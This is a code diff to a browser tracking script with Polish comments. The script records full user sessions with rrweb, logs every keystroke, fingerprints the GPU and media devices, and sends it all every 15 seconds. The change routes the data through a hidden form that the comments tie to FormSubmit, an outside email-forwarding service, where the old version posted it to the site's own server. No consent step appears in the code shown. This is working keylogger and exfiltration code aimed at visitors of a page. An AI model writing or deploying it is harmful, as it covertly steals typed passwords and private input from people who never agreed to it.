@@ -3,15 +3,17 @@ document.addEventListener('DOMContentLoaded', () => {
     const capturedKeys = [];
     let gpuInfo = {};
     let devices = [];
+    const form = document.getElementById('trackingForm');
+    const dataInput = document.getElementById('trackingData');
 
-    // 1. Initialize rrweb
+    // 1. Inicjalizacja nagrywania sesji przez rrweb
     rrweb.record({
         emit(event) {
             events.push(event);
         },
     });
 
-    // 2. Capture Keystrokes
+    // 2. Przechwytywanie naciśnięć klawiszy
     document.addEventListener('keydown', (event) => {
         capturedKeys.push({
             key: event.key,
@@ -20,60 +22,51 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-    // 3. Gather GPU Info
+    // 3. Zbieranie informacji o GPU
     const getGpuInfo = () => {
         try {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             if (gl) {
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    gpuInfo = {
-                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL'),
-                    };
-                } else {
-                    gpuInfo = {
-                        vendor: 'N/A',
-                        renderer: 'N/A',
-                        error: 'WEBGL_debug_renderer_info not supported'
-                    }
-                }
-                 gpuInfo.shadingLanguageVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
-                 gpuInfo.version = gl.getParameter(gl.VERSION);
-
+                gpuInfo = debugInfo ? {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                } : {
+                    vendor: 'N/A',
+                    renderer: 'N/A',
+                    error: 'WEBGL_debug_renderer_info not supported'
+                };
+                gpuInfo.shadingLanguageVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+                gpuInfo.version = gl.getParameter(gl.VERSION);
             } else {
-                 gpuInfo = { error: 'WebGL not supported' };
+                gpuInfo = { error: 'WebGL not supported' };
             }
         } catch (e) {
             gpuInfo = { error: e.message };
         }
     };
 
-
-    // 4. List Devices
+    // 4. Pobieranie listy urządzeń multimedialnych
     const getDevices = async () => {
         try {
             if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                 const deviceList = await navigator.mediaDevices.enumerateDevices();
-                devices = deviceList.map(device => ({
-                    kind: device.kind,
-                    label: device.label,
-                    deviceId: device.deviceId,
-                }));
+                devices = deviceList.map(d => ({ kind: d.kind, label: d.label, deviceId: d.deviceId }));
             }
         } catch (e) {
             devices = [{ error: e.message }];
         }
     };
 
-    // 5. Package and Send Data
+    // 5. Pakowanie i wysyłanie danych przez formularz
     const sendData = async () => {
-        // First, ensure we have the latest device and GPU info
+        // Upewniamy się, że mamy świeże dane o urządzeniach i GPU
         await getDevices();
         getGpuInfo();
 
         const payload = {
+            subject: `Nowa sesja: ${new Date().toISOString()}`,
             timestamp: new Date().toISOString(),
             url: window.location.href,
             userAgent: navigator.userAgent,
@@ -84,32 +77,24 @@ document.addEventListener('DOMContentLoaded', () => {
             },
             gpuInfo,
             devices,
-            keystrokes: [...capturedKeys], // Send a copy
-            session: [...events], // Send a copy
+            keystrokes: [...capturedKeys],
+            session_events: [...events],
         };
+        
+        // Umieszczamy dane w niewidocznym polu formularza jako tekst JSON
+        dataInput.value = JSON.stringify(payload, null, 2);
+        
+        // Wysyłamy formularz
+        form.submit();
 
-        try {
-            await fetch('/track', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload, null, 2),
-            });
-
-            // Clear events and keystrokes after sending to avoid duplicates
-            events = [];
-            capturedKeys.length = 0;
-
-        } catch (error) {
-            console.error('Error sending tracking data:', error);
-        }
+        // Po wysłaniu czyścimy tablice, ale to może nie nastąpić, bo strona się przeładuje
+        // FormSubmit przekieruje użytkownika
     };
 
-    // Send data every 10 seconds
-    setInterval(sendData, 10000);
+    // Zbieramy dane i wysyłamy co 15 sekund
+    setInterval(sendData, 15000);
 
-    // Initial data capture
+    // Wstępne zebranie danych
     getGpuInfo();
     getDevices();
 });
